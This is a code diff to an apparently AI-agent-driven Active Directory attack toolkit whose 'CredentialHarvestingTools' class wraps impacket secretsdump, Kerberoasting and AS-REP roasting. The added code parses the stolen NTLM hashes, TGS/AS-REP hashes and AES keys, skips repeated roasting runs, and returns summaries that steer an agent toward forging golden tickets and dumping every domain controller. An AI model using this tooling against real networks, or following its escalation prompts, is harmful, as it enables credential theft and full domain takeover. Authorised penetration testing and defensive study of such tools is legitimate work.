@@ -326,6 +326,35 @@ class CredentialHarvestingTools(Toolset):
                 except Exception as e:
                     logger.warning(f"Failed to auto-announce DA: {e}")
 
+            # Truncate raw output to save tokens — hashes already extracted to state
+            if _parsed_hashes:
+                hash_usernames = sorted({h["username"] for h in _parsed_hashes})
+                summary_parts = [
+                    f"Secretsdump {target} ({domain or 'unknown'}): extracted "
+                    f"{len(_parsed_hashes)} NTLM hash(es) for: {', '.join(hash_usernames)}. "
+                    f"Hashes have been added to state."
+                ]
+                if has_krbtgt:
+                    summary_parts.append(
+                        "KRBTGT HASH EXTRACTED - GOLDEN TICKET POSSIBLE! "
+                        "Use generate_golden_ticket to forge tickets."
+                    )
+                if has_administrator:
+                    summary_parts.append(
+                        "ADMINISTRATOR HASH EXTRACTED - DOMAIN ADMIN ACHIEVED! "
+                        "Run secretsdump on all remaining DCs."
+                    )
+                # Extract AES keys summary if present
+                aes_matches = re.findall(
+                    r"^([^:]+):aes256-cts-hmac-sha1-96:([a-fA-F0-9]+)$",
+                    raw_output,
+                    re.MULTILINE,
+                )
+                if aes_matches:
+                    aes_users = sorted({m[0].split("\\")[-1] for m in aes_matches})
+                    summary_parts.append(f"AES256 keys also extracted for: {', '.join(aes_users)}.")
+                return " ".join(summary_parts)
+
             return formatted_output
 
         except Exception as e:
@@ -386,6 +415,13 @@ class CredentialHarvestingTools(Toolset):
                     )
                     break
 
+        # Dedup: skip if we already kerberoasted this domain with any valid cred
+        roast_key = f"kerberoast:{domain.lower()}"
+        if self.state and hasattr(self.state, "processed_spidered_shares"):
+            if roast_key in self.state.processed_spidered_shares:
+                return f"[*] Already performed Kerberoasting on {domain} - skipping (results won't change with different creds)"
+            self.state.processed_spidered_shares.add(roast_key)
+
         auth_domain = credential_domain or domain
         cmd = [
             "impacket-GetUserSPNs",
@@ -407,6 +443,7 @@ class CredentialHarvestingTools(Toolset):
 
             if self.state and output:
                 matches = re.findall(r"(\$krb5tgs\$[^\s]+)", output)
+                roasted_usernames: list[str] = []
                 for value in matches:
                     username_value = "Unknown"
                     domain_value = ""
@@ -418,6 +455,7 @@ class CredentialHarvestingTools(Toolset):
                             username_value = user_part
                         if realm_part:
                             domain_value = realm_part
+                    roasted_usernames.append(username_value)
                     hash_obj = Hash(
                         username=username_value,
                         hash_value=value,
@@ -428,6 +466,13 @@ class CredentialHarvestingTools(Toolset):
                         self.state.add_hash(hash_obj, "kerberoast")
                     else:
                         self.state.hashes.append(hash_obj)
+
+                if matches:
+                    return (
+                        f"Kerberoasted {domain}: found {len(matches)} service account(s) "
+                        f"with crackable TGS hashes: {', '.join(roasted_usernames)}. "
+                        f"Hashes have been extracted and submitted for cracking."
+                    )
 
             return output
 
@@ -633,6 +678,13 @@ class CredentialHarvestingTools(Toolset):
 
         is_cross_domain = credential_domain and credential_domain.lower() != domain.lower()
 
+        # Dedup: skip if we already AS-REP roasted this domain
+        roast_key = f"asrep:{domain.lower()}"
+        if self.state and hasattr(self.state, "processed_spidered_shares"):
+            if roast_key in self.state.processed_spidered_shares:
+                return f"[*] Already performed AS-REP roasting on {domain} - skipping (results won't change with different creds)"
+            self.state.processed_spidered_shares.add(roast_key)
+
         try:
             if is_cross_domain:
                 # GetNPUsers doesn't support -target-domain in current impacket.
@@ -749,6 +801,11 @@ class CredentialHarvestingTools(Toolset):
                         f"- **Discovery Method:** impacket-GetNPUsers (AS-REP roasting)\n"
                         f"- **Impact:** Offline cracking may yield valid credentials for "
                         f"lateral movement and privilege escalation."
+                    )
+                    return (
+                        f"AS-REP roasted {domain}: found {len(matches)} user(s) without "
+                        f"pre-authentication: {', '.join(usernames)}. "
+                        f"Hashes have been extracted and submitted for cracking."
                     )
 
             return output
